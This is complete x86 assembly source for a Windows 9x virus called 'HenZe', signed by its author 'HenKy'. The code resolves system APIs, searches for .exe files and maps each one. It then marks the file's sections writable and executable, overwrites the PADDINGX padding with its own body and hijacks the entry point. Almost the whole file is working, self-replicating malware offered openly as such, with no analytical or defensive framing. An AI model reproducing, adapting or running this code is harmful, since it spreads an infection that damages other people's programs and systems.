;----------------------------  W95 HenZe BY HenKy -----------------------------
;
;-AUTHOR:        HenKy
;
;-MAIL:          HenKy_@latinmail.com
;
;-ORIGIN:        SPAIN
;


.586P
.MODEL FLAT
LOCALS


EXTRN       ExitProcess:PROC

KERNEL95    EQU 0BFF70000h
MIX_SIZ     EQU FILE_END-MEGAMIX
MIX_MEM     EQU MEM_END-MEGAMIX
NABLA       EQU DELTA-MEGAMIX
MARKA       EQU 66
FLAGZ       EQU 00000020H OR 20000000H OR 80000000H
MAX_PATH    EQU 260

MACROSIZE   MACRO

            DB      MIX_SIZ/01000 mod 10 + "0"
            DB      MIX_SIZ/00100 mod 10 + "0"
            DB      MIX_SIZ/00010 mod 10 + "0"
            DB      MIX_SIZ/00001 mod 10 + "0"

            ENDM

    ; LAME W9X PARASITIC RUNTIME PADDINGX OVERWRITER
    ; INFECTED FILES WONT GROW, BUT NEED PADDINGX SERIES (USSUALLY AT RELOC SECTION)

	; MOV 
	; CALL 
	; JNZ      ONLY SIX OPCODES WERE USED.. xDDD
	; ADD   /
	; SUB  /
	; CMP /

		 ; AND NO INDEXING MODE (EASY DISASM CODE)

		;MOV EAX,[EBP+5]

		;TURNS INTO:

		; ADD EBP,5
		; MOV EAX,[EBP]

		;AND SO...

       ; *INFINITE* THX TO T00FiC FOR THE REDUCED OPCODE SET IDEA AND

       ;  SEVERAL META TIPS

.DATA

copyrisgt   DB 'HenZe '

        MACROSIZE
.CODE

           ; BIZARRE VIRUS BEGINS...
MEGAMIX:


        MOV     EAX, 401005H
   MILO EQU     $-4
DELTA:
        MOV     EBP,EAX
WINES:
        MOV     EAX,KERNEL95
        MOV     CL,'M'
        CMP     BYTE PTR [EAX],CL
        JNZ     WARNING
        MOV     EBX,EAX
        MOV     EDX,02b226A57h ; GPA SIGNATURE FOR W9X

BUSCA3:
        ADD     EAX,1
        CMP     DWORD PTR [EAX],EDX
        JNZ     SHORT BUSCA3
 APIZ:

        MOV     ECX,OFFSET GPA
        ADD     ECX,EBP
        SUB     ECX,OFFSET DELTA
        MOV     [ECX],EAX
        MOV     ESI, OFFSET APIs
        ADD     ESI,EBP
        SUB     ESI,OFFSET DELTA
        MOV     EDI,OFFSET APIaddresses
        ADD     EDI,EBP
        SUB     EDI,OFFSET DELTA

GPI:    SUB     ESP,4
        MOV     [ESP],ESI
        SUB     ESP,4
        MOV     [ESP],EBX
        MOV     ECX,OFFSET GPA
        ADD     ECX,EBP
        SUB     ECX,OFFSET DELTA
        CALL    [ECX]

        MOV     [EDI],EAX
        ADD     EDI,4


 NPI:
        MOV     AL,BYTE PTR [ESI]
        ADD     ESI,1

        CMP     AL,0
        JNZ     SHORT NPI
        CMP     [ESI], AL
        JNZ     GPI



INFECT:

        MOV     EAX, OFFSET Win32FindData
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        SUB     ESP,4
        MOV     [ESP],EAX
        MOV     EAX,OFFSET IMASK
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        SUB     ESP,4
        MOV     [ESP],EAX
        MOV     EAX,OFFSET FindFirstFile
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        CALL    [EAX]
        MOV     EBX, OFFSET SearcHandle
        ADD     EBX,EBP
        SUB     EBX,OFFSET DELTA
        MOV     [EBX],EAX


LOOPER:
        CMP     EAX,-1
        JNZ     SUPPER


WARNING:

        MOV     EAX,12345678H
        ORG     $-4
OLD_EIP DD      00401000H
        ADD     ESP,4
        CALL    EAX   ; SUXXX!!! I DONT WANT TO WASTE JMP HERE

SUPPER:

        CMP      EAX,0
        JNZ      ALLKEY
PILLE:
        CMP      ESP,0   ; ESP NEVER IS ZERO
        JNZ      WARNING

ALLKEY:

        SUB     ESP,4
        MOV     EAX,OFFSET OLD_EIP
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        MOV     EBX,[EAX]
        MOV     [ESP],EBX
        SUB     ESP,4
        MOV     [ESP],EDX
        SUB     ESP,4
        MOV     [ESP],00000080h
        SUB     ESP,4
        MOV     [ESP],3
        SUB     ESP,4
        MOV     [ESP],EDX
        SUB     ESP,4
        MOV     [ESP],EDX
        SUB     ESP,4
        MOV     [ESP],0C0000000h

        MOV     EAX ,offset FNAME        ; OPEN IT!
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        SUB     ESP,4
        MOV     [ESP],EAX
        MOV     EAX, OFFSET CreateFile
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        CALL    [EAX]

        MOV     EBX,OFFSET FileHandle
        ADD     EBX,EBP
        SUB     EBX, OFFSET DELTA
        MOV     [EBX],EAX  ; SAVE HNDL
        MOV     EBX,OFFSET WFD_nFileSizeLow
        ADD     EBX,EBP
        SUB     EBX, OFFSET DELTA
        MOV     ECX, [EBX]

        MOV     EDX,0
        SUB     ESP,4
        MOV     [ESP],EDX
        SUB     ESP,4
        MOV     [ESP],ECX
        SUB     ESP,4
        MOV     [ESP],EDX
        SUB     ESP,4
        MOV     [ESP],4H
        SUB     ESP,4
        MOV     [ESP],EDX

        SUB     ESP,4
        MOV     EBX,OFFSET FileHandle
        ADD     EBX,EBP
        SUB     EBX,OFFSET DELTA
        MOV     ECX,[EBX]
        MOV     [ESP],ECX
        MOV     EAX, OFFSET CreateFileMappingA
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        CALL    [EAX]

        MOV     EBX,OFFSET MapHandle
        ADD     EBX,EBP
        SUB     EBX, OFFSET DELTA
        MOV     [EBX],EAX

        MOV     EBX,OFFSET WFD_nFileSizeLow
        ADD     EBX,EBP
        SUB     EBX, OFFSET DELTA
        MOV     ECX, [EBX]

        MOV     EDX,0
        SUB     ESP,4
        MOV     [ESP],ECX
        SUB     ESP,4
        MOV     [ESP],EDX
        SUB     ESP,4
        MOV     [ESP],EDX
        ADD     EDX,2
        SUB     ESP,4
        MOV     [ESP],EDX
        SUB     ESP,4
        MOV     ECX, OFFSET MapHandle
        ADD     ECX,EBP
        SUB     ECX,OFFSET DELTA
        MOV     EBX,[ECX]
        MOV     [ESP],EBX
        MOV     EBX, OFFSET MapViewOfFile
        ADD     EBX,EBP
        SUB     EBX,OFFSET DELTA
        CALL    [EBX]

        MOV     EBX,OFFSET  MapAddress
        ADD     EBX,EBP
        SUB     EBX,OFFSET DELTA
        MOV     [EBX],EAX
        MOV     ESI,EAX                         ; GET PE HDR
        MOV     EDX,EAX
        ADD     EAX,3CH
        MOV     ESI,[EAX]
        ADD     ESI,EDX
        CMP     BYTE PTR [ESI],"P"            ; IS A 'P'E ?
        JNZ     Cerrar
        ADD     ESI,MARKA
        CMP     BYTE PTR [ESI],"H"     ; HenKy IS HERE ?
        JNZ     Cerrar1
        CMP     ESP,0
        JNZ     Cerrar

Cerrar1:
        SUB     ESI,MARKA
        MOV     EBX,ESI
        ADD     EBX,3CH
        MOV     EAX,[EBX] ; ONLY SOME W98  HAVE 1000H/1000H INSTEAD 1000H/200H
        MOV     ECX,ESI
        ADD     ECX,56
        CMP     EAX,[ECX]
        JNZ     Cerrar

        SUB     ESP,4
        MOV     [ESP],ESI
        MOV     ECX,0
        MOV     EDI,ESI
        ADD     EDI,6
        MOV     CL,BYTE PTR [EDI]
        ADD     EDI,74H-6
        MOV     EBX,[EDI]
        ADD     EBX,EBX
        ADD     EBX,EBX
        ADD     EBX,EBX
        ADD     ESI,78H
        ADD     ESI,EBX
        ADD     ESI,24H
 WRI:
        MOV     DWORD PTR [ESI], 0C0000040h
        ADD     ESI,40
        SUB     ECX,1
        CMP     ECX,0
        JNZ     WRI

        MOV     ESI,[ESP]
        ADD     ESP,4

        MOV     EDI,ESI
        ADD     ESI,28H
        MOV     EAX,[ESI]
        ADD     ESI,34H-28H
        ADD     EAX,[ESI]
        MOV     ECX,[ESI]
        MOV     EDX,OFFSET BASE
        ADD     EDX,EBP
        SUB     EDX,OFFSET DELTA
        MOV     [EDX],ECX
        MOV     EBX,OFFSET OLD_EIP
        ADD     EBX,EBP
        SUB     EBX,OFFSET DELTA
        MOV     [EBX],EAX
        MOV     ESI,EDI
        ADD     ESI,MARKA
        MOV     BYTE PTR [ESI],"H" ;  HenKy!
        MOV     EAX,OFFSET WFD_nFileSizeLow
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        MOV     ECX,[EAX]
        MOV     EAX,EDI
 BU:
        CMP     DWORD PTR [EDI], 'XGNI'
        JNZ     PE
        CMP     ESP,0
        JNZ     PO

 PE:
        ADD     EDI,1
        SUB     ECX,1
        CMP     ECX,0
        JNZ     BU
        CMP     ESP,0
        JNZ     Cerrar

PO:
        MOV     ESI,EDI
        ADD     ESI,4
        CMP     DWORD PTR [ESI], 'DAPX'
        JNZ     PE
        SUB     ESP,4
        MOV     [ESP],EDI
        MOV     EBX,OFFSET MapAddress
        ADD     EBX,EBP
        SUB     EBX,OFFSET DELTA
        SUB     EDI,[EBX]
        ADD     EAX,28H
        MOV     [EAX],EDI
        MOV     EBX,OFFSET BASE
        ADD     EBX,EBP
        SUB     EBX,OFFSET DELTA
        ADD     EDI,[EBX]
        ADD     EDI,5
        MOV     EDX,OFFSET MILO
        ADD     EDX,EBP
        SUB     EDX,OFFSET DELTA
        MOV     [EDX],EDI

        MOV     EDI,[ESP]
        ADD     ESP,4

        MOV     ESI,OFFSET MEGAMIX
        ADD     ESI,EBP
        SUB     ESI,OFFSET DELTA
        MOV     ECX,MIX_SIZ/4

BASTARDO_VIRUS:

        MOV     EAX,[ESI]
        MOV     [EDI],EAX
        ADD     ESI,4
        ADD     EDI,4
        SUB     ECX,1
        CMP     ECX,0
        JNZ     BASTARDO_VIRUS

UnMapFile:

        MOV     EAX, OFFSET MapAddress
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        SUB     ESP,4
        MOV     [ESP],EAX
        MOV     EAX, OFFSET UnmapViewOfFile
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        CALL    [EAX]

CloseMap:

        MOV     EAX, OFFSET MapHandle
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        SUB     ESP,4
        MOV     [ESP],EAX
        MOV     EAX, OFFSET CloseHandle
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        CALL    [EAX]


Cerrar:

        MOV     EAX,OFFSET OLD_EIP
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        MOV     EBX,[ESP]
        MOV     [EAX],EBX
        ADD     ESP,4

        MOV     EAX, OFFSET FileHandle
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        SUB     ESP,4
        MOV     [ESP],EAX
        MOV     EAX, OFFSET CloseHandle
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        CALL    [EAX]


TOPO:


        MOV     EAX, offset Win32FindData
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        SUB     ESP,4
        MOV     [ESP],EAX

        MOV     EAX, OFFSET SearcHandle
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        SUB     ESP,4
        MOV     [ESP],EAX
        MOV     EAX, OFFSET FindNextFile
        ADD     EAX,EBP
        SUB     EAX,OFFSET DELTA
        CALL    [EAX]
        CMP     ESP,0
        JNZ     LOOPER


APIs:
        DB      "CreateFileA",0
        DB      "CloseHandle",0
        DB      "FindFirstFileA",0
        DB      "FindNextFileA",0
        DB      "MapViewOfFile",0
        DB      "UnmapViewOfFile",0
        DB      "CreateFileMappingA",0
Zero_   DB        0
BASE    DD        0

IMASK   DB       '*.ExE',0
        DB        'HenZe LameVirus BY HenKy',0

align 4

FILE_END               LABEL BYTE

APIaddresses:

CreateFile          DD 0
CloseHandle         DD 0
FindFirstFile       DD 0
FindNextFile        DD 0
MapViewOfFile       DD 0
UnmapViewOfFile     DD 0
CreateFileMappingA  DD 0
GPA                 DD 0
SearcHandle         DD 0
FileHandle          DD 0
MapHandle           DD 0
MapAddress          DD 0

FILETIME                STRUC

FT_dwLowDateTime        DD      ?
FT_dwHighDateTime       DD      ?

FILETIME                ENDS

Win32FindData:

WFD_dwFileAttributes    DD      ?
WFD_ftCreationTime      FILETIME ?
WFD_ftLastAccessTime    FILETIME ?
WFD_ftLastWriteTime     FILETIME ?
WFD_nFileSizeHigh       DD      ?
WFD_nFileSizeLow        DD      ?
WFD_dwReserved0         DD      ?
WFD_dwReserved1         DD      ?
FNAME                   DD      0
                        DD      0
                        DD      0
                        DD      0
                        DD      0
                        DD      0
align 4


MEM_END                LABEL BYTE

EXITPROC:

        PUSH 0
        CALL ExitProcess

ENDS
END MEGAMIX
